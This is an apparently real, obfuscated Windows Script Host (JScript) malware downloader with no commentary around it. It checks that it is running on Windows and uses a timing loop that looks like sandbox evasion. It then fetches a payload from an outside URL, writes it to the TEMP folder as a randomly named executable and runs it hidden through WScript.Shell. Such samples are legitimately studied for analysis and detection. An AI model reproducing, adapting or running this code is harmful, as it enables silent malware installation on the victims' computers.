var FK = false;
var a = "CreateObject";
var i = function d() {return WScript[a]("WScript.Shell");}(), j = 11;
var F = "MSXML2.XMLHTTP";
var t0 = 2123213;
var al = 0;
function z(Z0){i["Run"](Z0, al, al);};
function g(){return "" + F;};
function AW(i0, Xl){al = al * 1; return i0 - Xl;};
function P(){return a;};
/*@cc_on
  @if (@_win32 || @_win64)
    FK = true;
  @end
@*/
if (FK)
{
var G = "";
function A(){return 22;};
var dH = 0; var Vd = 0;
function Ee()
{
var t = new this["Date"]();
var iH = t["getUTCMilliseconds"]();
WScript["Sleep"](A());
var t = new this["Date"]();
var Z = t["getUTCMilliseconds"]();
WScript["Sleep"](A());
var t = new this["Date"]();
var y = t["getUTCMilliseconds"]();
var dH = "Wq";
dH = AW(Z, iH);
var Vd = "L";
Vd = AW(y, Z);
G = "open";
return AW(dH, Vd);
}
var hV = false;
var jT = false;
for (var w = al; w < A() * 1; w++){if (Ee() != al){
hV = true; 
Vd = "31" + 11 * dH + Vd; 
jT = true; 
break;
}}
function S() {return ((hV == true) && (hV == jT)) ? 1 : al;};
if (hV && S() && jT){
function xc() {return i["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "WYsfGfgFEyNXmvd.exe";};
 fI = g();
 g0 = WScript[a](fI);
 var N = 1;
 while (N){
try {
g0[G]("GET", "http://kingsstaging.consines.in/l9osaw", false);
g0["send"]();
R = "Sleep";
for (;;){WScript[R](A() * 11); if (g0["readystate"] >= 2 * 2) break;};
N = al;
} catch(ZZ){};
}
function bT(B) {var Zn = (1, 2, 3, 4, 5, B); return Zn;};
q = WScript[P()]("ADODB.Stream");
fI = q;
fI[G]();
fI["type"] = bT(1);
fI["write"](g0["ResponseBody"]);
q["position"] = bT(al);
fI["Save" + "ToFile"](xc(), 2);
q["c"+"lose"]();
V = xc();
z(V);
}
}

